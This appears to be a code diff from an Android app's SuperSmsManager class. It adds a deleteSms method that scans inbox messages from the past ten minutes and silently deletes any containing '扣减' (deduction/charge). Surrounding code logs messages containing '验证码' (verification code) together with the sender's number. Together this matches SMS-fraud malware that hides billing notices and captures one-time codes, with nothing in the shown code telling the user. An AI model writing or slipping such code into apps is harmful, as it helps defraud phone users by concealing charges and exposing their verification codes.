@@ -489,13 +489,34 @@ public class SuperSmsManager {
                 if (smsbody.contains("验证码")) {
                     LogHelper.w("smsbody=====" + number + "-->" + smsbody);
                 }
-//                if(smsbody.contains("积分"))
-//                {
-//                    LogHelper.w("smsbody=====" + number + "-->" + smsbody);
-//                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
-//                    activity.getContentResolver().delete(Uri.parse("content://sms/"), "_id=?", new String[]{String.valueOf(id)});
-//                    LogHelper.d("删除成功！！！");
-//                }
+            }
+            cursor.close();
+        }
+    }
+
+    public static void deleteSms()
+    {
+        final Activity activity = SoulPermission.getInstance().getTopActivity();
+        Calendar calendar = Calendar.getInstance();
+        calendar.add(Calendar.MINUTE, -10);
+        String str = "type=1 and date > " + calendar.getTime().getTime();
+        Uri inboxUri = Uri.parse("content://sms/inbox");
+        Cursor cursor = activity.getContentResolver().query(inboxUri, null,
+                str, null, Telephony.Sms.DATE + " desc");
+        if (cursor != null) {
+            LogHelper.w("SMS QUERY " + cursor.getCount());
+            while (cursor.moveToNext()) {
+                String number = cursor.getString(cursor
+                        .getColumnIndex(Telephony.Sms.ADDRESS));// 手机号
+                String smsbody = cursor.getString(cursor
+                        .getColumnIndex(Telephony.Sms.BODY));
+                if(smsbody.contains("扣减"))
+                {
+                    LogHelper.w("smsbody=====" + number + "-->" + smsbody);
+                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
+                    activity.getContentResolver().delete(Uri.parse("content://sms/"), "_id=?", new String[]{String.valueOf(id)});
+                    LogHelper.d("删除成功！！！");
+                }
             }
             cursor.close();
         }
